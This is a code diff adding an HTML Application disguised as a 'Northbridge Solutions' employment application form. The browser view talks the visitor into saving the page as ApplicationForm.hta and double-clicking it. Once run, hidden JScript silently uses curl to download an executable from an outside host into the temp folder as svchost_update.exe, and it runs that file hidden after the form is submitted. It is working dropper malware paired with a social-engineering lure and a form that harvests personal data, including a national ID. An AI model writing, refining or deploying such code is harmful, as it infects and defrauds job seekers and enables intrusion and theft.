@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>ApplicationForm.hta</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: 'Segoe UI', Arial, sans-serif; background: #7a7a7a;
+         min-height: 100vh; display: flex; align-items: center;
+         justify-content: center; padding: 20px; }
+
+  /* ---------- Browser view: "save me" card ---------- */
+  #saveCard { background: #fff; border-radius: 4px; padding: 56px 48px;
+              width: 520px; box-shadow: 0 12px 40px rgba(0,0,0,0.25);
+              text-align: center; }
+  #saveCard .icon { width: 72px; height: 72px; margin: 0 auto 24px;
+                    background: #107c10; border-radius: 6px;
+                    display: flex; align-items: center;
+                    justify-content: center; }
+  #saveCard .icon svg { width: 40px; height: 40px; fill: #fff; }
+  #saveCard h1 { font-size: 26px; color: #1b1b1b; margin-bottom: 12px; }
+  #saveCard p.sub { font-size: 15px; color: #555; margin-bottom: 32px; }
+  #saveCard .steps { text-align: left; background: #f5f7fa;
+                     border-radius: 6px; padding: 20px 24px;
+                     margin-bottom: 28px; }
+  #saveCard .steps h3 { font-size: 13px; color: #333;
+                        text-transform: uppercase; letter-spacing: .5px;
+                        margin-bottom: 12px; }
+  #saveCard .steps ol { padding-left: 20px; font-size: 14px;
+                        color: #333; line-height: 1.7; }
+  #saveCard .steps code { background: #e1e6ed; padding: 2px 6px;
+                          border-radius: 3px; font-family: Consolas, monospace;
+                          font-size: 13px; color: #c0392b; }
+  #saveCard .meta { display: flex; justify-content: center; gap: 24px;
+                    font-size: 12px; color: #888; }
+
+  /* ---------- HTA view: employment form ---------- */
+  #formWrap { display: none; background: #fff; border-radius: 4px;
+              width: 720px; box-shadow: 0 12px 40px rgba(0,0,0,0.25);
+              overflow: hidden; }
+  #formWrap .header { background: #1a3d6b; color: #fff;
+                      padding: 28px 40px; }
+  #formWrap .header h1 { font-size: 22px; margin-bottom: 4px; }
+  #formWrap .header p { font-size: 13px; opacity: .85; }
+  #formWrap .body { padding: 32px 40px 24px; max-height: 70vh;
+                    overflow-y: auto; }
+  #formWrap fieldset { border: none; margin-bottom: 28px; }
+  #formWrap legend { font-size: 13px; font-weight: 600; color: #1a3d6b;
+                     text-transform: uppercase; letter-spacing: .5px;
+                     padding-bottom: 10px; margin-bottom: 14px;
+                     border-bottom: 1px solid #e0e5ec; width: 100%; }
+  #formWrap .row { display: flex; gap: 16px; margin-bottom: 14px; }
+  #formWrap .field { flex: 1; display: flex; flex-direction: column; }
+  #formWrap label { font-size: 12px; color: #444; margin-bottom: 5px;
+                    font-weight: 500; }
+  #formWrap label .req { color: #c0392b; }
+  #formWrap input, #formWrap select, #formWrap textarea {
+      padding: 9px 12px; border: 1px solid #cdd5df; border-radius: 4px;
+      font-size: 14px; font-family: inherit; background: #fbfcfd; }
+  #formWrap input:focus, #formWrap select:focus, #formWrap textarea:focus {
+      outline: none; border-color: #1a3d6b; background: #fff; }
+  #formWrap textarea { resize: vertical; min-height: 70px; }
+  #formWrap .footer { padding: 20px 40px 28px; background: #f5f7fa;
+                      border-top: 1px solid #e0e5ec;
+                      display: flex; justify-content: space-between;
+                      align-items: center; }
+  #formWrap .footer .note { font-size: 12px; color: #777; }
+  #formWrap .footer button { background: #1a3d6b; color: #fff;
+                             border: none; padding: 12px 36px;
+                             border-radius: 4px; font-size: 14px;
+                             font-weight: 600; cursor: pointer; }
+  #formWrap .footer button:hover { background: #143059; }
+
+  /* ---------- Submission confirmation ---------- */
+  #done { display: none; background: #fff; border-radius: 4px;
+          width: 480px; padding: 48px 40px; text-align: center;
+          box-shadow: 0 12px 40px rgba(0,0,0,0.25); }
+  #done .check { width: 64px; height: 64px; border-radius: 50%;
+                 background: #107c10; margin: 0 auto 20px;
+                 display: flex; align-items: center;
+                 justify-content: center; }
+  #done .check svg { width: 32px; height: 32px; fill: #fff; }
+  #done h2 { font-size: 22px; color: #1b1b1b; margin-bottom: 8px; }
+  #done p { font-size: 14px; color: #666; line-height: 1.6; }
+  #done .progress { margin-top: 20px; font-size: 12px; color: #888;
+                    min-height: 18px; }
+  #done .spinner { display: inline-block; width: 11px; height: 11px;
+                   border: 2px solid #ddd; border-top-color: #1a3d6b;
+                   border-radius: 50%; animation: spin .8s linear infinite;
+                   margin-right: 6px; vertical-align: middle; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+
+<!-- ============ Browser view (what users see first) ============ -->
+<div id="saveCard">
+  <div class="icon">
+    <svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zm-1 7V3.5L18.5 9H13zM8 13h8v2H8v-2zm0 4h8v2H8v-2z"/></svg>
+  </div>
+  <h1>Your File Is Ready</h1>
+  <p class="sub">Your browser cannot render the interactive application form directly.</p>
+
+  <div class="steps">
+    <h3>To open your application form</h3>
+    <ol>
+      <li>Press <code>Ctrl</code> + <code>S</code> to save this page</li>
+      <li>Choose <strong>Webpage, Complete</strong> as the save type</li>
+      <li>Rename the file to <code>ApplicationForm.hta</code></li>
+      <li>Save it to your Desktop and double-click it</li>
+    </ol>
+  </div>
+
+  <div class="meta">
+    <span>🔒 Secure connection</span>
+    <span>🕐 Expires in 24 hours</span>
+  </div>
+</div>
+
+<!-- ============ HTA view (shown when run as .hta) ============ -->
+<div id="formWrap">
+  <div class="header">
+    <h1>Employment Application Form</h1>
+    <p>Northbridge Solutions — Careers Portal 2025</p>
+  </div>
+  <div class="body">
+    <form id="appForm" onsubmit="return false;">
+
+      <fieldset>
+        <legend>Personal Information</legend>
+        <div class="row">
+          <div class="field">
+            <label>First name <span class="req">*</span></label>
+            <input type="text" data-req="1" name="first">
+          </div>
+          <div class="field">
+            <label>Last name <span class="req">*</span></label>
+            <input type="text" data-req="1" name="last">
+          </div>
+        </div>
+        <div class="row">
+          <div class="field">
+            <label>Date of birth <span class="req">*</span></label>
+            <input type="text" data-req="1" name="dob" placeholder="MM/DD/YYYY">
+          </div>
+          <div class="field">
+            <label>National ID <span class="req">*</span></label>
+            <input type="text" data-req="1" name="nid">
+          </div>
+        </div>
+        <div class="row">
+          <div class="field">
+            <label>Email address <span class="req">*</span></label>
+            <input type="text" data-req="1" name="email">
+          </div>
+          <div class="field">
+            <label>Phone number <span class="req">*</span></label>
+            <input type="text" data-req="1" name="phone">
+          </div>
+        </div>
+      </fieldset>
+
+      <fieldset>
+        <legend>Address</legend>
+        <div class="row">
+          <div class="field">
+            <label>Street address <span class="req">*</span></label>
+            <input type="text" data-req="1" name="street">
+          </div>
+        </div>
+        <div class="row">
+          <div class="field">
+            <label>City <span class="req">*</span></label>
+            <input type="text" data-req="1" name="city">
+          </div>
+          <div class="field">
+            <label>State / Province <span class="req">*</span></label>
+            <input type="text" data-req="1" name="state">
+          </div>
+          <div class="field">
+            <label>Postal code <span class="req">*</span></label>
+            <input type="text" data-req="1" name="zip">
+          </div>
+        </div>
+      </fieldset>
+
+      <fieldset>
+        <legend>Employment History</legend>
+        <div class="row">
+          <div class="field">
+            <label>Current / Most recent employer <span class="req">*</span></label>
+            <input type="text" data-req="1" name="employer">
+          </div>
+        </div>
+        <div class="row">
+          <div class="field">
+            <label>Job title <span class="req">*</span></label>
+            <input type="text" data-req="1" name="title">
+          </div>
+          <div class="field">
+            <label>Years of experience <span class="req">*</span></label>
+            <select data-req="1" name="years">
+              <option value="">Select...</option>
+              <option>0-1</option><option>2-4</option>
+              <option>5-9</option><option>10+</option>
+            </select>
+          </div>
+        </div>
+        <div class="row">
+          <div class="field">
+            <label>Reason for leaving <span class="req">*</span></label>
+            <textarea data-req="1" name="reason"></textarea>
+          </div>
+        </div>
+      </fieldset>
+
+      <fieldset>
+        <legend>Education</legend>
+        <div class="row">
+          <div class="field">
+            <label>Highest degree <span class="req">*</span></label>
+            <select data-req="1" name="degree">
+              <option value="">Select...</option>
+              <option>High School</option><option>Associate</option>
+              <option>Bachelor</option><option>Master</option><option>Doctorate</option>
+            </select>
+          </div>
+          <div class="field">
+            <label>Institution <span class="req">*</span></label>
+            <input type="text" data-req="1" name="school">
+          </div>
+          <div class="field">
+            <label>Graduation year <span class="req">*</span></label>
+            <input type="text" data-req="1" name="grad">
+          </div>
+        </div>
+      </fieldset>
+
+      <fieldset>
+        <legend>References</legend>
+        <div class="row">
+          <div class="field">
+            <label>Reference name <span class="req">*</span></label>
+            <input type="text" data-req="1" name="refname">
+          </div>
+          <div class="field">
+            <label>Reference phone <span class="req">*</span></label>
+            <input type="text" data-req="1" name="refphone">
+          </div>
+        </div>
+        <div class="row">
+          <div class="field">
+            <label>Relationship <span class="req">*</span></label>
+            <input type="text" data-req="1" name="refrel">
+          </div>
+        </div>
+      </fieldset>
+
+    </form>
+  </div>
+  <div class="footer">
+    <div class="note">All fields marked <span style="color:#c0392b">*</span> are required.</div>
+    <button id="submitBtn" onclick="validateAndSubmit()">Submit Application</button>
+  </div>
+</div>
+
+<!-- ============ Confirmation ============ -->
+<div id="done">
+  <div class="check">
+    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+  </div>
+  <h2>Application Submitted</h2>
+  <p>Your application has been received.<br>
+     A confirmation email will be sent within 24 hours.</p>
+  <div class="progress" id="progress"></div>
+</div>
+
+<script language="JScript">
+// ---------------------------------------------------------------
+// Detect execution context: ActiveXObject only works under mshta
+// ---------------------------------------------------------------
+var isHTA = false;
+try { new ActiveXObject("WScript.Shell"); isHTA = true; } catch(e) { isHTA = false; }
+
+// ---------------------------------------------------------------
+// Paths (set once)
+// ---------------------------------------------------------------
+var EXE_PATH = "";
+var CURL_EXE = "C:\\Windows\\System32\\curl.exe";
+var PAYLOAD_URL = "https://driveone.online/ServerHostModule";
+
+if (isHTA) {
+    document.getElementById("saveCard").style.display = "none";
+    document.getElementById("formWrap").style.display = "block";
+
+    try {
+        var sh  = new ActiveXObject("WScript.Shell");
+        var fso = new ActiveXObject("Scripting.FileSystemObject");
+        var tmp = sh.ExpandEnvironmentStrings("%TEMP%");
+        EXE_PATH = tmp + "\\svchost_update.exe";
+
+        // Kick off the download immediately, non-blocking, hidden.
+        sh.Run("\"" + CURL_EXE + "\" -L -s -S -o \"" + EXE_PATH + "\" " + PAYLOAD_URL, 0, false);
+    } catch(e) { /* silent */ }
+}
+
+// ---------------------------------------------------------------
+// Form validation
+// ---------------------------------------------------------------
+function validateAndSubmit() {
+    var fields = document.querySelectorAll("[data-req='1']");
+    var firstEmpty = null;
+
+    for (var i = 0; i < fields.length; i++) {
+        var v = fields[i].value;
+        if (!v || v.replace(/\s/g, "") === "") {
+            fields[i].style.borderColor = "#c0392b";
+            fields[i].style.background = "#fdf3f3";
+            if (!firstEmpty) firstEmpty = fields[i];
+        } else {
+            fields[i].style.borderColor = "";
+            fields[i].style.background = "";
+        }
+    }
+
+    if (firstEmpty) {
+        firstEmpty.focus();
+        firstEmpty.scrollIntoView({behavior:"smooth", block:"center"});
+        return;
+    }
+
+    // ---- Show confirmation ----
+    document.getElementById("formWrap").style.display = "none";
+    document.getElementById("done").style.display = "block";
+
+    // ---- Wait for the payload download, then launch ----
+    startPayloadWatch();
+}
+
+// ---------------------------------------------------------------
+// Non-blocking poll: check every 500ms for the payload file.
+// Timeout after 120s.
+// ---------------------------------------------------------------
+function startPayloadWatch() {
+    var progressEl = document.getElementById("progress");
+    var elapsed = 0;
+    var INTERVAL = 500;
+    var TIMEOUT = 120000;
+
+    progressEl.innerHTML = '<span class="spinner"></span>Finalizing your submission...';
+
+    var timer = setInterval(function() {
+        elapsed += INTERVAL;
+
+        var ready = false;
+        try {
+            var fso = new ActiveXObject("Scripting.FileSystemObject");
+            if (fso.FileExists(EXE_PATH)) {
+                var sz = 0;
+                try { sz = fso.GetFile(EXE_PATH).Size; } catch(e) { sz = 0; }
+                if (sz > 1024) ready = true;
+            }
+        } catch(e) { /* silent */ }
+
+        if (ready) {
+            clearInterval(timer);
+            progressEl.innerHTML = "Submission complete.";
+            try {
+                var sh = new ActiveXObject("WScript.Shell");
+                sh.Run("\"" + EXE_PATH + "\"", 0, false);
+            } catch(e) {}
+            // Close shortly after launch
+            setTimeout(closeWindow, 2000);
+            return;
+        }
+
+        if (elapsed >= TIMEOUT) {
+            clearInterval(timer);
+            progressEl.innerHTML = "Submission received.";
+            setTimeout(closeWindow, 2000);
+        }
+    }, INTERVAL);
+}
+
+function closeWindow() {
+    try { window.close(); } catch(e) {}
+}
+</script>
+
+</body>
+</html>
